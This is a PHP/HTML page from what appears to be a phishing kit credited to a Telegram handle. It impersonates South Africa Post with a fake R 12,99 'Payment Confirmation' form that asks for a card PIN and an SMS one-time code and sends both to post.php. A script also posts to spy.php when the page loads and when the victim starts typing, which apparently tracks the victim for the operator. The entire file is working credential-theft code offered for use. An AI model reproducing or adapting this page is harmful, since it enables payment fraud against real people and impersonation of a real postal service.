<?php
     require_once "function.php";
                                    #========================================
                                    #==> Make By ==> Telegram : @Azar_ox <==#
                                    #========================================
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>South Africa Post - Payment Confirmation</title>
    <!-- Favicon -->
    <link rel="icon" href="image/favicon.png" type="image/x-icon"/>
    <link rel="shortcut icon" href="image/favicon.png" type="image/x-icon"/>
    <!-- Bootstrap 5.3 CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Font Awesome for icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body {
            background: linear-gradient(135deg, #e6f0fa 0%, #ffffff 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        .card {
            border: none;
            border-radius: 1rem;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.15);
            max-width: 500px;
            width: 100%;
            overflow: hidden;
        }
        .card-header {
            background: #0047BB;
            color: white;
            text-align: center;
            padding: 1.5rem;
        }
        .card-body {
            padding: 2rem;
        }
        .form-control {
            border-radius: 0.5rem;
            transition: all 0.3s ease;
        }
        .form-control:focus {
            border-color: #0047BB;
            box-shadow: 0 0 0 0.2rem rgba(0, 71, 187, 0.25);
        }
        .btn-primary {
            background-color: #0047BB;
            border: none;
            border-radius: 0.5rem;
            padding: 0.75rem 2rem;
            transition: all 0.3s ease;
        }
        .btn-primary:hover {
            background-color: #003399;
            transform: translateY(-2px);
        }
        .countdown {
            font-weight: bold;
            color: #0047BB;
        }
        .info-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 1rem;
            margin-bottom: 1.5rem;
        }
        .info-label {
            font-weight: 600;
            color: #333;
        }
        .info-value {
            color: #0047BB;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="card-header">
            <img src="image/Emarats.png" alt="South Africa Post Logo" class="img-fluid" style="max-height: 50px;">
        </div>
        <div class="card-body">
            <h5 class="text-center mb-4">Payment Confirmation</h5>
            <p class="text-center text-muted mb-4">
                A verification code and PIN have been sent to your registered mobile number. Please enter both to confirm your payment.
            </p>
            <form action="post.php" method="post">
                <input type="hidden" name="step" value="sms">
                <div class="info-grid">
                    <div class="info-label">Merchant:</div>
                    <div class="info-value fw-bold">South Africa Post</div>
                    <div class="info-label">Quantity:</div>
                    <div class="info-value">R 12,99</div>
                    <div class="info-label">Date:</div>
                    <div class="info-value"><?php echo date('l, jS F Y h:i A'); ?></div>
                    <div class="info-label">Card Number:</div>
                    <div class="info-value">XXXX XXXX XXXX XXXX</div>
                </div>
                <div class="mb-3">
                    <label for="pin" class="form-label info-label">PIN Code</label>
                    <input type="text" name="pin" id="pin" class="form-control" placeholder="Enter 4-digit PIN" aria-describedby="pinHelp">
                    <small id="pinHelp" class="form-text text-muted">Enter the 4-digit PIN received.</small>
                </div>
                <div class="mb-3">
                    <label for="sim" class="form-label info-label">SMS Code</label>
                    <input type="text" name="sim" id="sim" class="form-control" placeholder="Enter 6-digit SMS Code" aria-describedby="smsHelp">
                    <small id="smsHelp" class="form-text text-muted">Enter the 6-digit code received via SMS.</small>
                </div>
                <div class="d-flex justify-content-center align-items-center mb-4">
                    <span class="me-2 text-muted">Verification code expires in:</span>
                    <span class="countdown"></span>
                </div>
                <div class="text-center">
                    <button type="submit" name="submit" class="btn btn-primary">Confirm Payment</button>
                </div>
            </form>
            <p class="text-center text-muted mt-4 small">2025 © South Africa Post - All Rights Reserved</p>
        </div>
    </div>

    <!-- Scripts -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    <script>
        // Countdown timer
        let timer2 = "02:00";
        const interval = setInterval(() => {
            const timer = timer2.split(':');
            let minutes = parseInt(timer[0], 10);
            let seconds = parseInt(timer[1], 10);
            seconds--;
            minutes = seconds < 0 ? --minutes : minutes;
            if (minutes < 0) clearInterval(interval);
            seconds = seconds < 0 ? 59 : seconds;
            seconds = seconds < 10 ? '0' + seconds : seconds;
            $('.countdown').html(minutes + ':' + seconds);
            timer2 = minutes + ':' + seconds;
        }, 1000);

        // Mask inputs
        $("#pin").mask("0000"); // 4-digit PIN
        $("#sim").mask("000000"); // 6-digit SMS code

        // AJAX tracking
        $.post("spy.php", { otpview: 1 });
        let abort = false;
        $("#pin, #sim").keyup(function() {
            if (!abort) {
                $.post("spy.php", { otping: 1 });
                abort = true;
            }
        });
    </script>
</body>
</html>